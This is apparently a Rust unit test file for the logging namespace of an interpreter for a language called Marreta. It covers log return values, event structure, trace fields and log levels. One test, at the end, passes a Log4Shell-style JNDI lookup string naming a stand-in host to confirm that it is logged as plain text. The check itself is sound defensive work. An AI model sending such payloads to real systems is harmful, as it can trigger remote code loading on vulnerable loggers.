use super::*;
use crate::lexer::Lexer;
use crate::parser::Parser;
use std::sync::{Mutex, OnceLock};

fn run(src: &str) -> Value {
    let tokens = Lexer::new(src).tokenize().unwrap();
    let program = Parser::new(tokens).parse().unwrap();
    Interpreter::new().execute(&program).unwrap()
}

fn run_err(src: &str) -> MarretaError {
    let tokens = Lexer::new(src).tokenize().unwrap();
    let program = Parser::new(tokens).parse().unwrap();
    Interpreter::new().execute(&program).unwrap_err()
}

fn with_env_var<T>(key: &str, value: Option<&str>, f: impl FnOnce() -> T) -> T {
    static ENV_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    let _guard = ENV_LOCK
        .get_or_init(|| Mutex::new(()))
        .lock()
        .expect("env lock poisoned");
    let previous = std::env::var(key).ok();
    // SAFETY: env access in this test helper is serialized through ENV_LOCK;
    // the variable is set, the closure runs, then the original is restored,
    // all while holding the lock, so no other thread observes the mutation.
    unsafe {
        match value {
            Some(value) => std::env::set_var(key, value),
            None => std::env::remove_var(key),
        }
    }
    let result = f();
    // SAFETY: restore step of the lock-guarded swap above.
    unsafe {
        match previous {
            Some(value) => std::env::set_var(key, value),
            None => std::env::remove_var(key),
        }
    }
    result
}

#[test]
fn test_log_identifier_resolves_to_namespace() {
    assert_eq!(run("log"), Value::LogNamespace);
}

#[test]
fn test_log_info_returns_original_string() {
    assert_eq!(
        run(r#"log.info("starting sync")"#),
        Value::String("starting sync".into())
    );
}

#[test]
fn test_log_warn_returns_original_map() {
    assert_eq!(
        run(r#"log.warn({ event: "order.created", order_id: 42 }).order_id"#),
        Value::Integer(42)
    );
}

#[test]
fn test_log_namespace_works_in_pipeline() {
    assert_eq!(
        run(r#"result = "client:secret" >> log.info() >> base64.encode()
result"#),
        Value::String("Y2xpZW50OnNlY3JldA==".into())
    );
}

#[test]
fn test_log_namespace_works_in_broadcast() {
    assert_eq!(
        run(r#"results = { event: "x", ok: true } *>>
    -> log.info()
    -> log.warn()
results.last().event"#,),
        Value::String("x".into())
    );
}

#[test]
fn test_log_rejects_unsupported_runtime_values() {
    let err = run_err("log.info(db)");
    assert!(
        matches!(err, MarretaError::TypeError { message, .. } if message.contains("log.info()") && message.contains("DbNamespace"))
    );
}

#[test]
fn test_log_builds_data_event_for_strings() {
    let interp = Interpreter::new();
    let event = interp
        .build_log_event(LogLevel::Info, &Value::String("starting sync".into()))
        .unwrap();

    let object = event.as_object().unwrap();
    assert_eq!(object.get("kind"), Some(&serde_json::json!("app_log")));
    assert_eq!(object.get("level"), Some(&serde_json::json!("info")));
    assert_eq!(
        object.get("data"),
        Some(&serde_json::json!("starting sync"))
    );
    assert!(object.contains_key("timestamp"));
    assert!(!object.contains_key("message"));
}

#[test]
fn test_log_event_includes_trace_fields_when_context_exists() {
    let interp = Interpreter::new().with_trace_context(TraceContext {
        trace_id: "0af7651916cd43dd8448eb211c80319c".into(),
        span_id: "b7ad6b7169203331".into(),
        trace_flags: "01".into(),
        tracestate: None,
    });
    let event = interp
        .build_log_event(LogLevel::Info, &Value::String("starting sync".into()))
        .unwrap();
    let object = event.as_object().unwrap();
    assert_eq!(object.get("kind"), Some(&serde_json::json!("app_log")));
    assert_eq!(
        object.get("trace_id"),
        Some(&serde_json::json!("0af7651916cd43dd8448eb211c80319c"))
    );
    assert_eq!(
        object.get("span_id"),
        Some(&serde_json::json!("b7ad6b7169203331"))
    );
}

#[test]
fn test_log_builds_data_event_for_maps() {
    let interp = Interpreter::new();
    let value = Value::map_from(vec![
        ("event".into(), Value::String("customer.created".into())),
        ("customer_id".into(), Value::Integer(7)),
    ]);
    let event = interp.build_log_event(LogLevel::Warn, &value).unwrap();

    let object = event.as_object().unwrap();
    assert_eq!(object.get("kind"), Some(&serde_json::json!("app_log")));
    assert_eq!(object.get("level"), Some(&serde_json::json!("warn")));
    assert_eq!(
        object.get("data"),
        Some(&serde_json::json!({
            "event": "customer.created",
            "customer_id": 7
        }))
    );
    assert!(!object.contains_key("message"));
}

#[test]
fn test_log_level_defaults_to_info() {
    with_env_var("MARRETA_LOG_LEVEL", None, || {
        let interp = Interpreter::new();
        assert_eq!(interp.configured_log_level(), LogLevel::Info);
        assert!(!interp.should_emit_log_level(LogLevel::Debug));
        assert!(interp.should_emit_log_level(LogLevel::Info));
    });
}

#[test]
fn test_log_level_debug_enables_debug_logs() {
    with_env_var("MARRETA_LOG_LEVEL", Some("debug"), || {
        let interp = Interpreter::new();
        assert_eq!(interp.configured_log_level(), LogLevel::Debug);
        assert!(interp.should_emit_log_level(LogLevel::Debug));
    });
}

#[test]
fn test_log_treats_jndi_like_payload_as_plain_literal_text() {
    let interp = Interpreter::new();
    let event = interp
        .build_log_event(
            LogLevel::Info,
            &Value::String("${jndi:ldap://evil.example/a}".into()),
        )
        .unwrap();

    assert_eq!(
        event,
        serde_json::json!({
            "timestamp": event.get("timestamp").cloned().unwrap(),
            "kind": "app_log",
            "level": "info",
            "data": "${jndi:ldap://evil.example/a}"
        })
    );
}
